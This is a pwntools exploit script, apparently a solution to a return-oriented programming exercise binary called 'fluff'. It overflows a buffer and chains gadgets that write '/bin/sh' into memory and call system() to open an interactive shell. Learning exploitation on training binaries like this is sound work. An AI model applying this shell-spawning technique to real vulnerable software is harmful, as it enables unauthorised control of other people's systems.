from pwn import *

elf= ELF("./fluff")
io=elf.process()

pop_r12_to_mov13d = 0x400832
log.info("pop r12; mov r13d :" + hex(pop_r12_to_mov13d))

dot_data_add = 0x601050
log.info(".data section address to save the string : " + hex(dot_data_add))

xor_r11_to_edi = 0x400822
log.info("GADGET xor r11, r11; pop r14; mov edi, 0x601050; ret; " + hex(xor_r11_to_edi))

xor_r11_to_mov_r13d = 0x40082f
log.info("GADGET  xor r11, r12; pop r12; mov r13d, 0x604060; ret; : " + hex(xor_r11_to_mov_r13d))

xchg_r11_to_mov_r11d = 0x400840
log.info("GADGET xchg r11, r10; pop r15; mov r11d, 0x602050; ret; : " + hex(xchg_r11_to_mov_r11d))

mov_qwrd_to_r12b = 0x40084e
log.info("GADGET mov qword ptr [r10], r11; pop r13; pop r12; xor byte ptr [r10], r12b; ret;  : " + hex(mov_qwrd_to_r12b))

 

payload  = b"A" * 40

payload += p64(pop_r12_to_mov13d) 
payload += p64(dot_data_add) 
payload += p64(xor_r11_to_edi) 
                                            
payload += b"FAKEXHAH"                      
payload += p64(xor_r11_to_mov_r13d) 
payload += b"/bin/sh\x00"                  
payload += p64(0x400840) 
payload += b"FAKEXHAH"                      #
payload += p64(xor_r11_to_edi) 
payload += b"FAKEXHAH"                      
payload += p64(xor_r11_to_mov_r13d) 
payload += b"FAKEXHAH"                     
payload += p64(mov_qwrd_to_r12b) 
payload += b"FAKEXHAH"                    
payload += b"\x00" * 8                    
                                            
payload += p64(0x4005e0)                                                                                      # calling system() finally
  
io.sendline(payload)
io.interactive()
